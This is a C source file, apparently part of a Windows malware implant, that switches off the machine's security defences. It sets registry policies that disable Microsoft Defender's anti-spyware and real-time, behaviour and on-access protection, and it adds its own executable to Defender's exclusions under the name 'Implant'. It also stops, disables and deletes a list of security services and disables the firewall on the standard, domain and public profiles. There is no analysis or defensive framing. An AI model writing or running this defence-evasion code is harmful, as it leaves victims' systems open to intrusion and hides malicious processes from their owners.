#include "security.h"
#include <winsvc.h>

void ManageService(const char *svcName) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return;

    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName,
                                  SERVICE_STOP | SERVICE_QUERY_STATUS |
                                  SERVICE_CHANGE_CONFIG | DELETE);
    if (hSvc) {
        SERVICE_STATUS ss;
        ControlService(hSvc, SERVICE_STOP, &ss);
        ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                             SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL,
                             NULL, NULL, NULL);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
}

void DisableDefender(void) {
    HKEY hk;
    DWORD val = 1;
    DWORD dwDisp;

    /* DisableAntiSpyware policy */
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);

    /* Disable real-time protection */
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);

    /* Add our process to exclusion list */
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Processes",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "Implant", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hk);
}

void KillSecurity(void) {
    DisableDefender();

    /* Stop security services */
    const char *svcs[] = {
        "WinDefend", "SecurityHealthService", "WdNisSvc",
        "Sense", "WdBoot", "WdFilter", "MsMpEng",
        "NisSrv", "MpKslDrv", "wscsvc",
        NULL
    };
    for (int i = 0; svcs[i]; i++)
        ManageService(svcs[i]);

    /* Disable firewall via registry */
    HKEY hk;
    DWORD val0 = 0;
    const char *fwPaths[] = {
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile"
    };
    for (int i = 0; i < 3; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fwPaths[i], 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
            RegSetValueExA(hk, "DoNotAllowExceptions", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
            RegCloseKey(hk);
        }
    }
}